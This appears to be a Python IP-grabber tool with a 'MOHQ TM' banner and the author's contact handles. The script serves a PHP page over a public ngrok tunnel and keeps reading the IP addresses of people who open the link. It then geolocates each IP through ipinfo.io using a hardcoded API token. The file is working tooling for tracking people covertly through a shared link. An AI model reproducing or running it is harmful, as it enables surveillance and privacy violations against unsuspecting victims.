import os
from pathlib import Path as ph
import requests as r
from pyngrok import ngrok 
import time
from subprocess import Popen as pop
#Colors
R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white
############
def Start():
    
    os.system("clear")
    
    print(f'{G}')
	
    print('███╗   ███╗ ██████╗ ██╗  ██╗ ██████╗     ████████╗███╗   ███╗')
    print('████╗ ████║██╔═══██╗██║  ██║██╔═══██╗    ╚══██╔══╝████╗ ████║')
    print('██╔████╔██║██║   ██║███████║██║   ██║       ██║   ██╔████╔██║')
    print('██║╚██╔╝██║██║   ██║██╔══██║██║▄▄ ██║       ██║   ██║╚██╔╝██║')
    print('██║ ╚═╝ ██║╚██████╔╝██║  ██║╚██████╔╝       ██║   ██║ ╚═╝ ██║')
    print('╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚══▀▀═╝        ╚═╝   ╚═╝     ╚═╝')
    print(f'{G}                            ************************************')
    print('                            ** Telegram : @Hamiyan_Haj_Qassem **')
    print('                            **     Email : mohq@gmail.com     **')
    print('                            ************************************')
    
    port=int(input(f"{C}Port {R}=> {C}"))
    def links():
        with open("log.txt","w") as log:
            pop(("php","-S",f"localhost:{str(port)}","-t","Web/"),stderr=log,stdout=log)
    links()
    #ngrok
    link=ngrok.connect(port,"http")
    print(f"\n\n{G}Link => {W} {link}")
    input()
    #test File
    def files_test():
        f_addr="./Web/ip.txt"
        size=ph(f_addr).stat().st_size
        if size != 0:
            ip=open(f_addr,"r").readlines()
            ip=ip[-1].strip()
            print(f"{G}Link Opend Ip {R}=> {C}{ip} \n {G}Date {R}=> {time.ctime()}")
            url=f"http://ipinfo.io/{ip}?token=f5415d8ea228a0"
            req=r.get(url)
            print(req.text)
    while 1:
        files_test()
Start()
